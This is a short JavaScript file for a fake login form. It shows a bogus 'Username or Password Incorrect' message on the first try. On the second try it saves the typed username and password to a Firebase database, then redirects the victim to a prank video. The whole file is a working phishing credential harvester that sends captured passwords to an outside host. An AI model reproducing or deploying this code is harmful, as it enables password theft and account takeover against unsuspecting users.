const form = document.getElementById("login");
const h1 = document.getElementById("text");

d = new Date();
log = false;
var text = 'Username or Password Incorrect';
var i = 0;

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function type() {
    if (i < text.length) {
        document.getElementById("text").innerHTML += text.charAt(i);
        i++;
        setTimeout(type, 100);
    }
}

form.addEventListener("submit", async event => {
    event.preventDefault();

    if (log === true) {
        h1.innerHTML = '';

        var uName = document.querySelector("#uName").value;
        var pass = document.querySelector("#pass").value;
        a = String(d.getDate()) + String(d.getTime());
        firebase.database().ref(a).set({
            'username': uName,
            'pass': pass

        });
        await sleep(2000);

        location.replace("https://youtu.be/dQw4w9WgXcQ")
    } else if (log === false) {
        type('Username or Password Incorrect');
        log = true;
    }
});

